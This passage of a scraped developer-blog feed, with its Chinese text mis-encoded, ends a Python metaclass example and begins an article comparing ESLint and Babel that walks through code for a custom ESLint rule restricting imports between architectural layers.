æ¯”å¦‚djangoçš„ormæˆ–pydanticçš„æ¨¡å‹</li>
</ul>
<h2 data-id="heading-1">2 ä»£ç ç¤ºä¾‹ï¼šå¼ºåˆ¶å±æ€§å¤§å†™</h2>
<p>å‡è®¾è¦å®ç°ä¸€ä¸ªåŠŸèƒ½ï¼šè®©æŸä¸ªç±»ä¸­å®šä¹‰çš„æ‰€æœ‰å±æ€§åè‡ªåŠ¨å˜æˆå¤§å†™</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ–¹å¼ä¸€ï¼šç›´æ¥æ”¹å­—å…¸</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UpperMeta</span>(<span class="hljs-title class_ inherited__">type</span>):
    <span class="hljs-string">"""æŠŠé™¤ __xxx__ ä»¥å¤–çš„æ‰€æœ‰å±æ€§åå¼ºåˆ¶å˜æˆå¤§å†™"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__new__</span>(<span class="hljs-params">mcs, name, bases, namespace, **kw</span>):
        new_ns = {}
        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> namespace.items():
            <span class="hljs-keyword">if</span> k.startswith(<span class="hljs-string">'__'</span>) <span class="hljs-keyword">and</span> k.endswith(<span class="hljs-string">'__'</span>):
                new_ns[k] = v          <span class="hljs-comment"># é­”æ³•æ–¹æ³•ä¿æŒåŸæ ·</span>
            <span class="hljs-keyword">else</span>:
                new_ns[k.upper()] = v  <span class="hljs-comment"># å…¶ä½™ç»Ÿä¸€å˜å¤§å†™</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().__new__(mcs, name, bases, new_ns, **kw)

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>(metaclass=UpperMeta):
    x = <span class="hljs-number">1</span>
    y = <span class="hljs-number">2</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">'hello'</span>

<span class="hljs-built_in">print</span>(Foo.X)        <span class="hljs-comment"># 1</span>
<span class="hljs-built_in">print</span>(Foo.Y)        <span class="hljs-comment"># 2</span>
<span class="hljs-built_in">print</span>(Foo.HELLO())  <span class="hljs-comment"># 'hello'</span>
</code></pre>
<p>ä½†æ˜¯åœ¨ï¼Œä¸€èˆ¬åœºæ™¯ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ç±»è£…é¥°å™¨æ¥ä»£æ›¿ï¼Œå› ä¸ºå®ƒæ›´åŠ ç®€å•ï¼Œå¯ä»¥é¿å¼€å…ƒç±»çš„å¤æ‚æ€§ã€‚
<a href="https://juejin.cn/post/7522090713556729865" target="_blank" title="https://juejin.cn/post/7522090713556729865">juejin.cn/post/752209â€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯ESLint å’Œ Babelå¯¹æ¯”]]></title>    <link>https://juejin.cn/post/7597596202025615402</link>    <guid>https://juejin.cn/post/7597596202025615402</guid>    <pubDate>2026-01-21T12:05:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597596202025615402" data-draft-id="7597641580104974390" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯ESLint å’Œ Babelå¯¹æ¯”"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-21T12:05:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å°å°å°å°å®‡"/> <meta itemprop="url" content="https://juejin.cn/user/3386151546662077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯ESLint å’Œ Babelå¯¹æ¯”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3386151546662077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å°å°å°å°å®‡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T12:05:21.000Z" title="Wed Jan 21 2026 12:05:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ESLint å’Œ Babel è™½ç„¶éƒ½åŸºäº ASTï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰å·¥ä½œï¼Œä½†å®ƒä»¬çš„è®¾è®¡ç›®çš„ã€å·¥ä½œæµå’Œ API è®¾è®¡æœ‰ç€æœ¬è´¨çš„åŒºåˆ«ã€‚</p>
<ol>
<li><strong>ESLint æ’ä»¶å®æˆ˜</strong>ï¼šå¼€å‘ä¸€ä¸ª <code>eslint-plugin-clean-arch</code>ï¼Œç”¨äºå¼ºåˆ¶æ‰§è¡Œâ€œæ•´æ´æ¶æ„â€çš„ä¾èµ–åŸåˆ™ï¼ˆä¾‹å¦‚ï¼šç¦æ­¢ UI å±‚ç›´æ¥å¯¼å…¥ DAO å±‚ï¼Œå¿…é¡»ç»è¿‡ Service å±‚ï¼‰ã€‚</li>
<li><strong>Babel æ’ä»¶å®æˆ˜</strong>ï¼šå¼€å‘ä¸€ä¸ª <code>babel-plugin-auto-try-catch</code>ï¼Œç”¨äºåœ¨ç¼–è¯‘æ—¶è‡ªåŠ¨ç»™ <code>async/await</code> å‡½æ•°åŒ…è£¹ <code>try-catch</code> å—ï¼Œå¹¶ä¸ŠæŠ¥é”™è¯¯ä¿¡æ¯ï¼Œé¿å…æ‰‹åŠ¨å†™å¤§é‡é‡å¤ä»£ç ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-0">ç¬¬ä¸€éƒ¨åˆ†ï¼šæ ¸å¿ƒå·®å¼‚æ¦‚è§ˆ</h3>
<p>åœ¨è¿›å…¥ä»£ç ä¹‹å‰ï¼Œå…ˆé€šè¿‡è¡¨æ ¼å»ºç«‹æ ¸å¿ƒè®¤çŸ¥ï¼š</p>








































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">ESLint æ’ä»¶</th><th align="left">Babel æ’ä»¶</th></tr></thead><tbody><tr><td align="left"><strong>æ ¸å¿ƒç›®æ ‡</strong></td><td align="left"><strong>ä»£ç è´¨é‡æ£€æŸ¥</strong>ä¸é£æ ¼ç»Ÿä¸€ï¼ˆLintingï¼‰</td><td align="left"><strong>ä»£ç è½¬æ¢</strong>ä¸ç¼–è¯‘ï¼ˆTranspilingï¼‰</td></tr><tr><td align="left"><strong>è¾“å‡ºç»“æœ</strong></td><td align="left">æŠ¥å‘Šé”™è¯¯/è­¦å‘Šï¼Œæˆ–è¿›è¡Œæºç çº§çš„å­—ç¬¦ä¸²æ›¿æ¢ï¼ˆFixï¼‰</td><td align="left">ç”Ÿæˆå…¨æ–°çš„ã€å…¼å®¹æ€§æ›´å¥½çš„ JavaScript ä»£ç </td></tr><tr><td align="left"><strong>AST æ ‡å‡†</strong></td><td align="left"><strong>ESTree</strong> (ä½¿ç”¨ <code>espree</code> è§£æ)</td><td align="left"><strong>Babel AST</strong> (åŸºäº ESTree ä½†æœ‰ç»†å¾®å·®å¼‚ï¼Œå¦‚ Literal åˆ†ç±»)</td></tr><tr><td align="left"><strong>éå†æ–¹å¼</strong></td><td align="left">æ‰å¹³åŒ–çš„é€‰æ‹©å™¨éå† (Selectors)</td><td align="left">è®¿é—®è€…æ¨¡å¼ (Visitor Pattern)</td></tr><tr><td align="left"><strong>ä¿®æ”¹èƒ½åŠ›</strong></td><td align="left">å¼±ã€‚ä¸»è¦é€šè¿‡ <code>fixer</code> æä¾›æ–‡æœ¬èŒƒå›´æ›¿æ¢ï¼Œå¿…é¡»ä¿æŒ AST æœ‰æ•ˆæ€§æ¯”è¾ƒéš¾</td><td align="left">å¼ºã€‚å¯ä»¥éšæ„å¢åˆ æ”¹æŸ¥èŠ‚ç‚¹ï¼Œç”Ÿæˆå®Œå…¨ä¸åŒçš„ä»£ç ç»“æ„</td></tr><tr><td align="left"><strong>è¿è¡Œæ—¶æœº</strong></td><td align="left">å¼€å‘æ—¶ï¼ˆIDEæç¤ºï¼‰ã€æäº¤æ—¶ï¼ˆHuskyï¼‰ã€CI/CD é˜¶æ®µ</td><td align="left">æ„å»ºæ‰“åŒ…é˜¶æ®µï¼ˆWebpack/Vite/Rollup åŠ è½½å™¨ä¸­ï¼‰</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-1">ç¬¬äºŒéƒ¨åˆ†ï¼šESLint è‡ªå®šä¹‰æ’ä»¶å®æˆ˜ (æ·±åº¦ä»£ç )</h3>
<h4 data-id="heading-2">åœºæ™¯æè¿°</h4>
<p>åœ¨å¤§å‹é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ§åˆ¶æ¨¡å—é—´çš„ä¾èµ–å…³ç³»ã€‚å‡è®¾é¡¹ç›®ç»“æ„å¦‚ä¸‹ï¼š</p>
<ul>
<li><code>src/views</code> (UIå±‚)</li>
<li><code>src/services</code> (ä¸šåŠ¡é€»è¾‘å±‚)</li>
<li><code>src/api</code> (æ•°æ®è®¿é—®å±‚)</li>
</ul>
<p><strong>è§„åˆ™</strong>ï¼š<code>src/views</code> ä¸‹çš„æ–‡ä»¶ï¼Œç¦æ­¢ç›´æ¥ <code>import</code> æ¥è‡ª <code>src/api</code> çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡ <code>src/services</code> è°ƒç”¨ã€‚</p>
<h4 data-id="heading-3">1. æ’ä»¶å…¥å£ç»“æ„</h4>
<p>é€šå¸¸å®šä¹‰åœ¨ <code>index.js</code> ä¸­ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@fileoverview</span> <span class="hljs-variable">eslint</span>-plugin-clean-arch
 * å¼ºåˆ¶æ‰§è¡Œé¡¹ç›®æ¶æ„åˆ†å±‚ä¾èµ–è§„åˆ™çš„ ESLint æ’ä»¶
 */</span>
<span class="hljs-meta">'use strict'</span>;

<span class="hljs-comment">// å¯¼å…¥æˆ‘ä»¬å³å°†ç¼–å†™çš„è§„åˆ™å®šä¹‰</span>
<span class="hljs-keyword">const</span> restrictLayerImports = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./rules/restrict-layer-imports'</span>);

<span class="hljs-comment">// æ’ä»¶ä¸»å…¥å£</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-comment">// æ’ä»¶å…ƒæ•°æ®</span>
  <span class="hljs-attr">meta</span>: {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'eslint-plugin-clean-arch'</span>,
    <span class="hljs-attr">version</span>: <span class="hljs-string">'1.0.0'</span>
  },
  <span class="hljs-comment">// æš´éœ²é…ç½®é¢„è®¾ï¼ˆç”¨æˆ·å¯ä»¥ç›´æ¥ extends: ['plugin:clean-arch/recommended']ï¼‰</span>
  <span class="hljs-attr">configs</span>: {
    <span class="hljs-attr">recommended</span>: {
      <span class="hljs-attr">plugins</span>: [<span class="hljs-string">'clean-arch'</span>],
      <span class="hljs-attr">rules</span>: {
        <span class="hljs-string">'clean-arch/restrict-layer-imports'</span>: <span class="hljs-string">'error'</span>
      }
    }
  },
  <span class="hljs-comment">// è§„åˆ™å®šä¹‰é›†åˆ</span>
  <span class="hljs-attr">rules</span>: {
    <span class="hljs-string">'restrict-layer-imports'</span>: restrictLayerImports
  },
  <span class="hljs-comment">// å¤„ç†å™¨ï¼ˆå¯é€‰ï¼Œç”¨äºå¤„ç†é JS æ–‡ä»¶ï¼Œå¦‚ .vue ä¸­çš„ scriptï¼‰</span>
  <span class="hljs-attr">processors</span>: {
    <span class="hljs-comment">// è¿™é‡Œç®€å•ç¤ºæ„ï¼Œé€šå¸¸ vue-eslint-parser å·²ç»å¤„ç†äº†</span>
  }
};
</code></pre>
<h4 data-id="heading-4">2. è§„åˆ™å®ç°æ ¸å¿ƒ (<code>rules/restrict-layer-imports.js</code>)</h4>
<p>è¿™æ˜¯æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼ŒåŒ…å«äº† AST åˆ†æé€»è¾‘ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@fileoverview</span> ç¦æ­¢è·¨å±‚çº§ç›´æ¥è°ƒç”¨
 */</span>
<span class="hljs-meta">'use strict'</span>;

<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-comment">// è¾…åŠ©å‡½æ•°ï¼šæ ‡å‡†åŒ–è·¯å¾„åˆ†éš”ç¬¦ï¼Œå…¼å®¹ Windows</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">normalizePath</span>(<span class="hljs-params">filePath</span>) {
  <span class="hljs-keyword">return</span> filePath.<span class="hljs-title function_">split</span>(path.<span class="hljs-property">sep</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">'/'</span>);
}

<span class="hljs-comment">// è¾…åŠ©å‡½æ•°ï¼šåˆ¤æ–­æ–‡ä»¶å±äºå“ªä¸ªå±‚çº§</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getLayer</span>(<span class="hljs-params">filePath</span>) {
  <span class="hljs-keyword">const</span> normalized = <span class="hljs-title function_">normalizePath</span>(filePath);
  <span class="hljs-keyword">if</span> (normalized.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/src/views/'</span>)) <span class="hljs-keyword">return</span> <span class="hljs-string">'views'</span>;
  <span class="hljs-keyword">if</span> (normalized.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/src/services/'</span>)) <span class="hljs-keyword">return</span> <span class="hljs-string">'services'</span>;
  <span class="hljs-keyword">if</span> (normalized.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/src/api/'</span>)) <span class="hljs-keyword">return</span> <span class="hljs-string">'api'</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-string">'other'</span>;
}

<span class="hljs-comment">/** <span class="hljs-doctag">@type</span> {<span class="hljs-type">import('eslint').Rule.RuleModule</span>} */</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">meta</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'problem'</span>, <span class="hljs-comment">// problem | suggestion | layout</span>
    <span class="hljs-attr">docs</span>: {
      <span class="hljs-attr">description</span>: <span class="hljs-string">'Enforce strict layer dependency rules: Views -&gt; Services -&gt; API'</span>,
      <span class="hljs-attr">category</span>: <span class="hljs-string">'Architecture'</span>,
      <span class="hljs-attr">recommended</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">url</span>: <span class="hljs-string">'https://my-company.wiki/arch-rules'</span>
    },
    <span class="hljs-attr">fixable</span>: <span class="hljs-literal">null</span>, <span class="hljs-comment">// æœ¬è§„åˆ™ä¸æä¾›è‡ªåŠ¨ä¿®å¤ï¼Œå› ä¸ºæ¶æ„è°ƒæ•´éœ€è¦äººå·¥ä»‹å…¥</span>
    <span class="hljs-comment">// å®šä¹‰é”™è¯¯æ¶ˆæ¯æ¨¡æ¿</span>
    <span class="hljs-attr">messages</span>: {
      <span class="hljs-attr">restrictedImport</span>: <span class="hljs-string">'æ¶æ„è¿è§„: "{{currentLayer}}" å±‚ç¦æ­¢ç›´æ¥å¼•å…¥ "{{targetLayer}}" å±‚æ¨¡å—ã€‚è¯·é€šè¿‡ Service å±‚ä¸­è½¬ã€‚'</span>,
      <span class="hljs-attr">invalidPath</span>: <span class="hljs-string">'æ— æ³•è§£æçš„å¯¼å…¥è·¯å¾„: {{importPath}}'</span>
    },
    <span class="hljs-comment">// è§„åˆ™é…ç½® Schema</span>
    <span class="hljs-attr">schema</span>: [
      {
        <span class="hljs-attr">type</span>: <span class="hljs-string">'object'</span>,
        <span class="hljs-attr">properties</span>: {
          <span class="hljs-comment">// å…è®¸ç”¨æˆ·è‡ªå®šä¹‰å±‚çº§æ˜ å°„</span>
          <span class="hljs-attr">layers</span>: {
            <span class="hljs-attr">type</span>: <span class="hljs-string">'object'</span>
          }
        },
        <span class="hljs-attr">additionalProperties</span>: <span class="hljs-literal">false</span>
      }
    ]
  },

  <span class="hljs-comment">/**
   * create æ–¹æ³•è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„æ–¹æ³•åä¸º AST é€‰æ‹©å™¨
   * ESLint éå† AST æ—¶ä¼šå›è°ƒè¿™äº›æ–¹æ³•
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">import('eslint').Rule.RuleContext</span>} <span class="hljs-variable">context</span>
   */</span>
  <span class="hljs-title function_">create</span>(<span class="hljs-params">context</span>) {
    <span class="hljs-comment">// è·å–å½“å‰æ­£åœ¨è¢« Lint çš„æ–‡ä»¶å</span>
    <span class="hljs-keyword">const</span> currentFilename = context.<span class="hljs-title function_">getFilename</span>();
    <span class="hljs-keyword">const</span> currentLayer = <span class="hljs-title function_">getLayer</span>(currentFilename);

    <span class="hljs-comment">// å¦‚æœå½“å‰æ–‡ä»¶ä¸åœ¨å—æ§å±‚çº§ä¸­ï¼Œç›´æ¥å¿½ç•¥</span>
    <span class="hljs-keyword">if</span> (currentLayer === <span class="hljs-string">'other'</span>) {
      <span class="hljs-keyword">return</span> {};
    }

    <span class="hljs-comment">// å®šä¹‰å±‚çº§ä¾èµ–çº¦æŸè¡¨</span>
    <span class="hljs-comment">// Key: å½“å‰å±‚çº§, Value: ç¦æ­¢å¼•å…¥çš„å±‚çº§é›†åˆ</span>
    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">RESTRICTED_MAP</span> = {
      <span class="hljs-string">'views'</span>: [<span class="hljs-string">'api'</span>], <span class="hljs-comment">// View å±‚ç¦æ­¢å¼•å…¥ API å±‚</span>
      <span class="hljs-string">'services'</span>: [],   <span class="hljs-comment">// Service å±‚å¯ä»¥å¼•å…¥ API</span>
      <span class="hljs-string">'api'</span>: [<span class="hljs-string">'views'</span>, <span class="hljs-string">'services'</span>] <span class="hljs-comment">// API å±‚é€šå¸¸æ˜¯åº•å±‚çš„ï¼Œä¸åº”åå‘ä¾èµ–</span>
    };

    <span class="hljs-comment">/**
     * æ ¸å¿ƒæ ¡éªŒé€»è¾‘
     * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ASTNode</span>} <span class="hljs-variable">node</span> - ImportDeclaration èŠ‚ç‚¹
     */</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyImport</span>(<span class="hljs-params">node</span>) {
      <span class="hljs-comment">// è·å– import çš„è·¯å¾„å€¼ï¼Œä¾‹å¦‚: import x from '@/api/user' ä¸­çš„ '@/api/user'</span>
      <span class="hljs-keyword">const</span> importPath = node.<span class="hljs-property">source</span>.<span class="hljs-property">value</span>;

      <span class="hljs-comment">// å¿½ç•¥ç¬¬ä¸‰æ–¹åº“ (é€šå¸¸ä¸ä»¥ . / @ å¼€å¤´ï¼Œæˆ–è€…æ˜¯ node_modules)</span>
      <span class="hljs-comment">// è¿™é‡Œç®€å•åˆ¤æ–­ï¼šå¦‚æœä¸æ˜¯ç›¸å¯¹è·¯å¾„ä¹Ÿä¸æ˜¯åˆ«åè·¯å¾„ï¼Œè®¤ä¸ºæ˜¯ npm åŒ…</span>
      <span class="hljs-keyword">if</span> (!importPath.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'.'</span>) &amp;&amp; !importPath.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'/'</span>) &amp;&amp; !importPath.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'@'</span>)) {
        <span class="hljs-keyword">return</span>;
      }

      <span class="hljs-comment">// å°è¯•è§£æå¯¼å…¥è·¯å¾„å¯¹åº”çš„å®é™…å±‚çº§</span>
      <span class="hljs-comment">// æ³¨æ„ï¼šåœ¨ ESLint è§„åˆ™ä¸­åšå®Œæ•´çš„æ–‡ä»¶ç³»ç»Ÿè§£ææ¯”è¾ƒé‡ï¼Œ</span>
      <span class="hljs-comment">// é€šå¸¸æˆ‘ä»¬ä¼šæ ¹æ®å­—ç¬¦ä¸²ç‰¹å¾åˆ¤æ–­ï¼Œæˆ–è€…ä¾èµ– resolver</span>
      <span class="hljs-keyword">let</span> targetLayer = <span class="hljs-string">'other'</span>;
      
      <span class="hljs-keyword">if</span> (importPath.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/api/'</span>) || importPath.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'@/api/'</span>)) {
        targetLayer = <span class="hljs-string">'api'</span>;
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (importPath.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/services/'</span>) || importPath.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'@/services/'</span>)) {
        targetLayer = <span class="hljs-string">'services'</span>;
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (importPath.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/views/'</span>) || importPath.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'@/views/'</span>)) {
        targetLayer = <span class="hljs-string">'views'</span>;
      }

      <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦è¿è§„</span>
      <span class="hljs-keyword">const</span> forbiddenLayers = <span class="hljs-variable constant_">RESTRICTED_MAP</span>[currentLayer] || [];
      
      <span class="hljs-keyword">if</span> (forbiddenLayers.<span class="hljs-title function_">includes</span>(targetLayer)) {
        context.<span class="hljs-title function_">report</span>({
          <span class="hljs-attr">node</span>: node.<span class="hljs-property">source</span>, <span class="hljs-comment">// é”™è¯¯çº¢çº¿æ ‡åœ¨è·¯å¾„å­—ç¬¦ä¸²ä¸Š</span>
          <span class="hljs-attr">messageId</span>: <span class="hljs-string">'restrictedImport'</span>, <span class="hljs-comment">// ä½¿ç”¨ meta.messages ä¸­å®šä¹‰çš„ ID</span>
          <span class="hljs-attr">data</span>: {
            <span class="hljs-attr">currentLayer</span>: currentLayer,
            <span class="hljs-attr">targetLayer</span>: targetLayer
          }
        });
      }
    }

    <span class="hljs-keyword">return</span> {
      <span class="hljs-comment">// ç›‘å¬ ES6 Import è¯­å¥</span>
      <span class="hljs-comment">// ä¾‹å¦‚: import { getUser } from '@/api/user';</span>
      <span class="hljs-title class_">ImportDeclaration</span>(node) {
        <span class="hljs-title function_">verifyImport</span>(node);
      },

      <span class="hljs-comment">// ç›‘å¬åŠ¨æ€ Import</span>
      <span class="hljs-comment">// ä¾‹å¦‚: const user = await import('@/api/user');</span>
      <span class="hljs-title class_">ImportExpression</span>(node) {
        <span class="hljs-comment">// åŠ¨æ€ import çš„ source å°±æ˜¯è°ƒç”¨çš„å‚æ•°</span>
        <span class="hljs-title function_">verifyImport</span>(node);
      },

      <span class="hljs-comment">// ç›‘å¬ CommonJS require (å¦‚æœé¡¹ç›®æ··ç”¨)</span>
      <span class="hljs-comment">// ä¾‹å¦‚: const api = require('@/api/user');</span>
      <span class="hljs-title class_">CallExpression</span>(node) {
        <span class="hljs-keyword">if</span> (
          node.<span class="hljs-property">callee</span>.<span class="hljs-property">name</span> === <span class="hljs-string">'require'</span> &amp;&amp;
          node.<span class="hljs-property">arguments</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> &amp;&amp;
          node.<span class="hljs-property">arguments</span>[<span class="hljs-number">0</span>].<span class="hljs-property">type</span> === <span class="hljs-string">'Literal'</span>
        ) {
          <span class="hljs-comment">// æ„é€ æˆç±»ä¼¼çš„ç»“æ„ä»¥ä¾¿å¤ç”¨ verifyImport</span>
          <span class="hljs-keyword">const</span> mockNode = {
